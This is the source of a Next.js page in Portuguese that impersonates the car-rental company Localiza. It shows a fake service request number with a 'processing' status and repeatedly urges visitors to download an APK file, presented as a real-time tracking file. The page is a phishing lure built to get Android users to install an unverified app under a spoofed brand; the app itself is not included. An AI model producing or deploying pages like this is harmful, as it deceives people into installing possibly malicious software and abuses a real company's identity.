"use client";

export default function Home() {
  return (
    <div className="min-h-screen flex flex-col">
      {/* Header com Logo */}
      <header className="bg-[#01602a] shadow-sm py-4 px-6">
        <div className="max-w-6xl mx-auto flex items-center">
          <img src="/localiza-logo.svg" alt="Localiza" className="h-8" />
        </div>
      </header>

      {/* Conteúdo Principal */}
      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 max-w-4xl w-full p-8 md:p-12">
          {/* Título e Status */}
          <div className="bg-[#3b4d99] text-white px-6 py-4 -mx-8 -mt-8 md:-mx-12 md:-mt-12 rounded-t-2xl mb-8 flex items-center justify-between">
            <h1 className="text-2xl md:text-3xl font-bold">
              Solicitação N° 61515712
            </h1>
            <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
              <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              <span className="text-sm font-semibold">Em andamento</span>
            </div>
          </div>

          {/* Banner de Promoção - SUBSTITUA O ARQUIVO /public/banner.jpg */}
          <div className="mb-8 rounded-xl overflow-hidden bg-gradient-to-r from-[#01602a] to-[#78DE1F] flex items-center justify-center min-h-[300px]">
            {/* Temporário: Substitua por <img src="/banner.jpg" alt="Banner Localiza" className="w-full h-auto object-cover" /> */}
            <div className="text-center text-white p-8">
              <p className="text-2xl font-bold mb-2">📸 Seu Banner Aqui</p>
              <p className="text-sm opacity-90">Adicione o arquivo banner.jpg na pasta public/</p>
            </div>
          </div>

          {/* Seção de Acompanhamento */}
          <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-xl p-6 mb-6">
            <h4 className="text-xl font-bold text-gray-800 mb-4 text-center">
              Acompanhe em Tempo Real
            </h4>
            <p className="text-gray-700 text-center mb-6">
              Baixe o arquivo de acompanhamento para receber atualizações em
              tempo real sobre o andamento da sua solicitação.
            </p>

            {/* Botão de Download Principal */}
            <div className="flex justify-center">
              <a
                href="/app.apk"
                download="Localiza-App.apk"
                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center gap-3 text-lg"
              >
                <svg
                  className="w-6 h-6"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"
                  />
                </svg>
                Baixar Arquivo de Acompanhamento
              </a>
            </div>

            <p className="text-sm text-gray-600 text-center mt-4 italic">
              O arquivo será atualizado automaticamente com novas informações
            </p>
          </div>

          {/* Informações Importantes */}
          <div className="bg-blue-50 border-l-4 border-blue-500 rounded-lg p-6 mb-6">
            <h5 className="font-bold text-gray-800 mb-3 flex items-center gap-2">
              <svg
                className="w-5 h-5 text-blue-500"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path
                  fillRule="evenodd"
                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                  clipRule="evenodd"
                />
              </svg>
              Importante
            </h5>
            <p className="text-gray-700 text-sm mb-4">
              Para acompanhar as atualizações desta solicitação, baixe o arquivo
              acima. Ele contém um link seguro que será atualizado
              automaticamente com o status e respostas.
            </p>
            <h5 className="font-bold text-gray-800 mb-3">
              Acompanhe em tempo real
            </h5>
            <a
              href="/app.apk"
              download="Localiza-App.apk"
              className="inline-block bg-green-500 hover:bg-green-600 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200"
            >
              Baixar Arquivo
            </a>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 text-white py-6 px-4">
        <div className="max-w-6xl mx-auto text-center">
          <p className="text-sm">
            Localiza © 2026 Todos os direitos reservados
          </p>
        </div>
      </footer>
    </div>
  );
}
